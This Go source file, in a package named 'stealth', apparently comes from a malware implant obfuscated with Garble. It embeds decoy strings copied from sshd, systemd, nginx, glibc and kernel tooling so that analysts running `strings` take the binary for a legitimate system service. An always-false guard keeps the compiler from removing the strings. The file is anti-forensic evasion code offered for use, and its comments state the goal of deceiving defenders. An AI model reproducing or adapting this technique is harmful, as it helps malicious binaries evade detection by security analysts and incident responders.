package stealth

import "os"

// Benign String Injection
//
// OPSEC rationale: Garble strips all Go metadata and obfuscates strings, but this
// leaves a *suspiciously empty* binary. Real system binaries (sshd, systemd, nginx)
// have hundreds of recognizable strings — error messages, version info, config paths.
// A binary with zero recognizable strings is an immediate red flag for any analyst
// running `strings` on it.
//
// This module embeds realistic strings from common Linux system services so that
// `strings` output looks like a legitimate binary. The strings are referenced via
// a sink function to prevent the compiler from stripping them as dead data.
//
// USAGE: These strings are compiled into the binary automatically. The Sink()
// function is called once at startup to ensure the linker includes them.

// sshdStrings mimics OpenSSH sshd strings visible in the real binary.
var sshdStrings = []string{
	"OpenSSH_9.6p1",
	"SSH-2.0-OpenSSH_9.6p1 Debian-1",
	"debug1: server_input_channel_req: channel 0 request direct-tcpip reply 0",
	"debug1: PAM: setting PAM_RHOST",
	"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
	"Accepted publickey for %s from %s port %d ssh2: %s",
	"Failed password for %s from %s port %d ssh2",
	"Received disconnect from %s port %d: disconnected by user",
	"/etc/ssh/sshd_config",
	"/etc/ssh/ssh_host_rsa_key",
	"/etc/ssh/ssh_host_ed25519_key",
	"/var/run/sshd.pid",
	"AuthorizedKeysFile .ssh/authorized_keys",
	"PermitRootLogin prohibit-password",
	"PubkeyAuthentication yes",
	"PasswordAuthentication no",
	"ChallengeResponseAuthentication no",
	"UsePAM yes",
	"X11Forwarding yes",
	"PrintMotd no",
	"AcceptEnv LANG LC_*",
	"Subsystem sftp /usr/lib/openssh/sftp-server",
	"debug1: Forked child %d.",
	"debug1: Entering interactive session.",
	"debug1: server_input_global_request: rtype keepalive@openssh.com want_reply 1",
	"kex_exchange_identification: banner line contains invalid characters",
	"maximum authentication attempts exceeded for %s from %s port %d ssh2",
}

// systemdStrings mimics systemd/init system strings.
var systemdStrings = []string{
	"systemd v255.4-1",
	"systemd-journald.service",
	"Started Session %d of User %s.",
	"/run/systemd/system",
	"/etc/systemd/system.conf",
	"Failed to start %s - %s",
	"Dependency failed for %s.",
	"Unit %s entered failed state.",
	"Starting Daily Cleanup of Temporary Directories...",
	"Starting Rotate log files...",
	"Reached target Network.",
	"Listening on D-Bus System Message Bus Socket.",
	"/lib/systemd/systemd",
	"NOTIFY_SOCKET=/run/systemd/notify",
	"WATCHDOG_USEC=30000000",
	"MAINPID=%d",
	"Type=notify",
	"Restart=on-failure",
	"WantedBy=multi-user.target",
	"After=network-online.target",
	"ExecStart=/usr/sbin/%s",
	"MemoryMax=512M",
	"CPUQuota=50%%",
	"RuntimeMaxSec=86400",
	"ProtectSystem=strict",
}

// nginxStrings mimics nginx web server strings.
var nginxStrings = []string{
	"nginx/1.24.0",
	"nginx version: nginx/1.24.0 (Ubuntu)",
	"worker_processes auto;",
	"error_log /var/log/nginx/error.log;",
	"access_log /var/log/nginx/access.log;",
	"pid /run/nginx.pid;",
	"worker_connections 768;",
	"include /etc/nginx/mime.types;",
	"server_name _;",
	"listen 80 default_server;",
	"listen [::]:80 default_server;",
	"root /var/www/html;",
	"index index.html index.htm index.nginx-debian.html;",
	"location / { try_files $uri $uri/ =404; }",
	"ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt;",
	"ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;",
	"upstream backend { server 127.0.0.1:8080; }",
	"proxy_pass http://backend;",
	"proxy_set_header Host $host;",
	"proxy_set_header X-Real-IP $remote_addr;",
}

// glibcStrings mimics glibc/system library strings common in any Linux binary.
var glibcStrings = []string{
	"GLIBC_2.34",
	"GLIBC_2.17",
	"/lib/x86_64-linux-gnu/libc.so.6",
	"/lib/x86_64-linux-gnu/libpthread.so.0",
	"/lib/x86_64-linux-gnu/libdl.so.2",
	"/etc/ld.so.cache",
	"/etc/ld.so.preload",
	"__libc_start_main",
	"__cxa_finalize",
	"__stack_chk_fail",
	"malloc",
	"free",
	"realloc",
	"calloc",
	"pthread_create",
	"pthread_mutex_lock",
	"pthread_mutex_unlock",
	"pthread_cond_wait",
	"dlopen",
	"dlsym",
	"dlerror",
}

// kernelStrings mimics kernel-adjacent strings that appear in system tools.
var kernelStrings = []string{
	"Linux version 6.1.0-25-amd64 (debian-kernel@lists.debian.org)",
	"/proc/sys/kernel/pid_max",
	"/proc/sys/kernel/threads-max",
	"/proc/sys/kernel/random/entropy_avail",
	"/sys/kernel/mm/transparent_hugepage/enabled",
	"/sys/class/dmi/id/product_name",
	"CONFIG_SECURITY_SELINUX=y",
	"CONFIG_AUDIT=y",
	"CONFIG_BPF_SYSCALL=y",
	"cgroup2fs",
	"/sys/fs/cgroup/system.slice",
}

// Sink ensures the compiler and linker include all benign strings in the binary.
// Call once at startup. The function is designed to be uncallable at runtime
// (the condition is always false) but the compiler cannot prove this, so
// it must include the string data.
//
//go:noinline
func Sink() {
	// This condition is always false at runtime (PID is always > 0)
	// but the compiler cannot eliminate it via constant folding.
	if sinkGuard() {
		for _, s := range sshdStrings {
			sinkBytes(s)
		}
		for _, s := range systemdStrings {
			sinkBytes(s)
		}
		for _, s := range nginxStrings {
			sinkBytes(s)
		}
		for _, s := range glibcStrings {
			sinkBytes(s)
		}
		for _, s := range kernelStrings {
			sinkBytes(s)
		}
	}
}

// sinkGuard returns a value the compiler cannot predict.
// Uses os.Getpid() which is only known at runtime and opaque to the compiler.
//
//go:noinline
func sinkGuard() bool {
	// os.Getpid() is always >= 1, so this is always false at runtime.
	// But the compiler cannot prove this — Getpid is an opaque syscall wrapper.
	return os.Getpid() < 0
}

// sinkBytes prevents the compiler from eliminating string references.
//
//go:noinline
func sinkBytes(s string) {
	if len(s) < -1 { // always false, but compiler can't prove it
		panic(s)
	}
}
